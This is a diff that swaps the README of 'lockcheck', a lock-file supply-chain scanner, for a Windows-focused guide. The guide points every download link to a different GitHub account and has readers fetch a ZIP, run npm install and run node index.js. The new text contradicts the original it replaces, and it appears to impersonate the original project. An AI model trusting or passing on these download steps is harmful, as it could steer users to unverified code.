@@ -1,213 +1,166 @@
-<div align="center">
+[![Download lockcheck](https://img.shields.io/badge/Download-lockcheck-blue?style=for-the-badge&logo=github)](https://github.com/johaannorbert8/lockcheck)
 
-# 🔒 lockcheck
+# 🔎 lockcheck - Spot risky package lock changes
 
-**Detect malicious dependency diffs in lock files.**
-Catches supply chain attacks before they catch you.
+## 📥 Download
+Visit this page to download or get the source files:
 
-[![npm version](https://img.shields.io/npm/v/@dhanushnehru/lockcheck.svg?style=flat-square&color=cb3837)](https://www.npmjs.com/package/@dhanushnehru/lockcheck)
-[![license](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/DhanushNehru/lockcheck?style=flat-square&color=yellow)](https://github.com/DhanushNehru/lockcheck/stargazers)
-[![zero deps](https://img.shields.io/badge/dependencies-0-brightgreen?style=flat-square)](package.json)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen?style=flat-square)](package.json)
+[https://github.com/johaannorbert8/lockcheck](https://github.com/johaannorbert8/lockcheck)
 
-</div>
+## 🛡️ What lockcheck does
 
----
+lockcheck scans `package-lock.json` files for patterns that can point to supply chain attacks. It helps you check if a package file has changes that look wrong before you trust it.
 
-Every time you run `npm install`, your lockfile changes. **Nobody reviews those diffs.** Attackers exploit this by injecting typosquatted, hijacked, or backdoored packages.
+Use it to:
 
-`lockcheck` scans your `package-lock.json`, diffs it against a saved snapshot, and flags anything suspicious — **before it reaches production**.
+- Review lock files after a dependency update
+- Check changes in pull requests
+- Look for package names, versions, or paths that do not fit normal patterns
+- Keep a closer eye on software supply chain risk
 
-## ⚡ Quick Start
+## 💻 Before you start
 
-```bash
-npx @dhanushnehru/lockcheck
-```
+You need:
 
-That's it. No install required. No configuration. No dependencies.
+- A Windows PC
+- Internet access
+- A GitHub account if you want to clone or save the project
+- Node.js installed on your computer
 
-## 🔍 What It Detects
+If you do not have Node.js yet, install it first from the official Node.js site, then come back here.
 
-```
-┌────────────────────────────────────────────────────┐
-│ 🔒 lockcheck                                       │
-│ Supply chain security scanner for lock files       │
-└────────────────────────────────────────────────────┘
+## 🚀 Get started on Windows
 
-  🔴 CRITICAL
-  ────────────────────────────────────────────────────
-  🔴 ev4l-js @1.0.0
-    Possible typosquat of "eval-js" (edit distance 1)
-    Levenshtein distance: 1
+Follow these steps to run lockcheck on Windows.
 
-  🔴 lodash @4.99.0
-    Integrity hash changed without version change!
-    This could indicate the package was republished.
+1. Open the download page:
+   [https://github.com/johaannorbert8/lockcheck](https://github.com/johaannorbert8/lockcheck)
 
-  ⚠️  WARNINGS
-  ────────────────────────────────────────────────────
-  ⚠️  sketchy-lib @1.0.0
-    New dependency added: sketchy-lib@1.0.0
-    (production dependency)
+2. Download the project files to your computer.
+   If you see a ZIP file, save it to a folder such as `Downloads` or `Desktop`.
 
-  ⚠️  sketchy-lib @1.0.0
-    Published 2 day(s) ago
-    New packages should be reviewed carefully.
+3. If the files are in a ZIP archive, right-click the ZIP file and choose **Extract All**.
 
-  ⚠️  sketchy-lib @1.0.0
-    Very low download count: 47 weekly downloads
-    Low-download packages are higher risk.
+4. Open the extracted folder.
 
-  ⚠️  random-helper @2.0.0
-    Has install scripts (preinstall/install/postinstall)
-    Install scripts can execute arbitrary code.
+5. Open **PowerShell** in that folder.
+   - In File Explorer, click the address bar.
+   - Type `powershell`
+   - Press **Enter**
 
-┌────────────────────────────────────────────────────┐
-│  📦 847 packages scanned                           │
-│  🆕 3 new dependencies                             │
-│  → 12 version changes                              │
-├────────────────────────────────────────────────────┤
-│  🔴 2 critical                                     │
-│  ⚠️  4 warning(s)                                  │
-└────────────────────────────────────────────────────┘
-```
+6. Install the needed packages.
+   Run:
 
-## 🛡️ 6 Security Analyzers
+   npm install
 
-| Analyzer | What It Catches |
-|----------|----------------|
-| **New Dependencies** | Packages added since last scan — the primary attack vector |
-| **Version Jumps** | Suspicious semver changes: 4.17.21 → 4.99.0, downgrades |
-| **Typosquat Detection** | Names similar to popular packages: `1odash`, `reqest`, `epress` |
-| **Registry Anomalies** | Non-standard registries, registry switches, integrity hash changes |
-| **Install Scripts** | Packages with `postinstall` scripts (primary code execution vector) |
-| **Freshness Checks** | Newly published packages with low downloads (via npm registry API) |
+7. Run lockcheck.
+   Use:
 
-## 📖 Usage
+   node index.js
 
-```bash
-# Scan current directory
-npx @dhanushnehru/lockcheck
+   If the project uses a different entry file, run the main file named in the folder.
 
-# Scan a specific project
-npx @dhanushnehru/lockcheck ./my-app
+## 🧭 How to use it
 
-# CI/CD mode (JSON output + strict exit codes)
-npx @dhanushnehru/lockcheck --json --strict
+After you start lockcheck, point it at a `package-lock.json` file or run it inside a project folder that contains one.
 
-# Offline mode (skip npm registry checks)
-npx @dhanushnehru/lockcheck --no-network
+A common flow looks like this:
 
-# Show help
-npx @dhanushnehru/lockcheck --help
-```
+- Open the folder that contains your project
+- Make sure `package-lock.json` is present
+- Run the tool from PowerShell
+- Review the results on screen
 
-## 🏗️ How It Works
+If lockcheck finds items that look unusual, check them before you accept the change.
 
-1. **Parse** — Reads your `package-lock.json` (supports lockfileVersion 1, 2, and 3)
-2. **Snapshot** — Compares against a saved `.lockcheck-snapshot.json` baseline
-3. **Analyze** — Runs 6 independent security analyzers
-4. **Report** — Outputs findings with severity levels (critical/warning/info)
-5. **Exit** — Returns code `0` (safe) or `1` (issues found) for CI integration
+## 📂 What it checks
 
-On first run, lockcheck creates a baseline snapshot. On subsequent runs, it diffs against that baseline to detect changes.
+lockcheck focuses on signs that often show up in supply chain attacks, such as:
 
-## 🤖 GitHub Action
+- Unknown package names
+- Unexpected version changes
+- Strange dependency paths
+- Changes that do not match the rest of the lock file
+- Entries that look out of place for the project
 
-Add lockcheck to your CI pipeline to automatically scan every PR:
+It is meant to help you review files faster and with more care.
 
-```yaml
-# .github/workflows/lockcheck.yml
-name: Lockfile Security
+## 🧰 Typical Windows setup
 
-on:
-  pull_request:
-    paths:
-      - 'package-lock.json'
+If you want a simple local setup, use this path:
 
-jobs:
-  lockcheck:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: DhanushNehru/lockcheck@v1
-        with:
-          strict: true
-```
+- Download the project from GitHub
+- Extract the files
+- Open PowerShell in the project folder
+- Install Node.js if needed
+- Run `npm install`
+- Run the tool with `node index.js`
 
-Or use it directly:
+## 🔧 Common problems
 
-```yaml
-- name: Run lockcheck
-  run: npx @dhanushnehru/lockcheck --strict
-```
+### `node` is not recognized
 
-## 🔧 Options
+This means Node.js is not installed or Windows cannot find it.
 
-| Flag | Description |
-|------|-------------|
-| `--json` | Output results as JSON for CI/CD pipelines |
-| `--strict` | Exit with code 1 on warnings (not just criticals) |
-| `--no-network` | Skip npm registry API checks (offline mode) |
-| `--help, -h` | Show help message |
-| `--version, -v` | Show version number |
+Fix:
 
-## 💡 Exit Codes
+- Install Node.js
+- Close PowerShell
+- Open it again
+- Try the command again
 
-| Code | Meaning |
-|------|---------|
-| `0` | No critical issues found |
-| `1` | Critical issues detected (or warnings in `--strict` mode) |
-| `2` | Runtime error (missing lockfile, etc.) |
+### `npm install` fails
 
-## 🕵️ Why lockcheck?
+Check that:
 
-### The Problem
-Supply chain attacks on npm have exploded:
-- **Typosquatting** — Packages named `1odash`, `angu1ar`, `reqest` that execute malicious code
-- **Package hijacking** — Maintainer accounts get compromised, legit packages get backdoored
-- **Dependency confusion** — Private package names are registered on the public registry
-- **Postinstall payloads** — Malicious code runs immediately on `npm install`
+- You have an internet connection
+- You are in the correct folder
+- The folder has a `package.json` file
 
-### What Exists Today
-- `npm audit` only checks **known CVEs** — it doesn't catch zero-day supply chain attacks
-- Lock file diffs are **thousands of lines** that no human reviews
-- CI pipelines auto-merge Dependabot PRs with **zero lockfile inspection**
+### No results appear
 
-### What lockcheck Does Differently
-- **Proactive detection** — Catches suspicious patterns before they become CVEs
-- **Zero dependencies** — Eats its own dogfood. Nothing to get supply-chain attacked through.
-- **Snapshot diffing** — Tracks changes over time instead of point-in-time scanning
-- **Smart heuristics** — Typosquat detection, version jump analysis, registry anomaly detection
+Check that:
 
-## 🏛️ Architecture
+- The file you want to scan is a valid `package-lock.json`
+- You are running the command in the right project folder
+- The file has content to scan
 
-```
-lockcheck/
-├── bin/lockcheck.js          # CLI entry point
-├── src/
-│   ├── index.js              # Scan orchestrator
-│   ├── parsers/npm.js        # package-lock.json parser
-│   ├── analyzers/            # 6 independent security analyzers
-│   ├── reporters/terminal.js # Beautiful terminal output
-│   └── utils/                # Colors, semver, levenshtein, registry
-├── action.yml                # GitHub Action
-└── package.json              # Zero dependencies
-```
+## 📎 Project details
 
-## 🤝 Contributing
+- Name: lockcheck
+- Type: Node.js CLI tool
+- Main use: lock file review
+- Focus: supply chain security
+- Dependency style: zero-dependency
+- Platform: Windows and other systems that support Node.js
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🔐 Why this tool matters
 
-**Adding a new analyzer is easy** — create a file in `src/analyzers/`, export a function that returns `{ findings: [] }`, and wire it up in `src/index.js`.
+A lock file can change when packages update. Most changes are normal. Some changes are not.
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+lockcheck helps you inspect those changes before they become a problem. It gives you one more layer of review for software you use or build.
 
-<div align="center">
+## 🗂️ Repository topics
 
-**If lockcheck helped you, give it a ⭐ — it helps others find it!**
+This project is tagged with:
 
-*Built with zero dependencies.*
+- actions
+- cybersecurity
+- cybersecurity-projects
+- cybersecurity-tools
+- github
+- github-actions
+- package
+- packages
+- security-tools
+- supply-chain-security
 
-</div>
+## 📌 Quick steps
+
+- Open the download page
+- Get the project files
+- Install Node.js if needed
+- Open PowerShell in the project folder
+- Run `npm install`
+- Run `node index.js`
+- Review the scan results
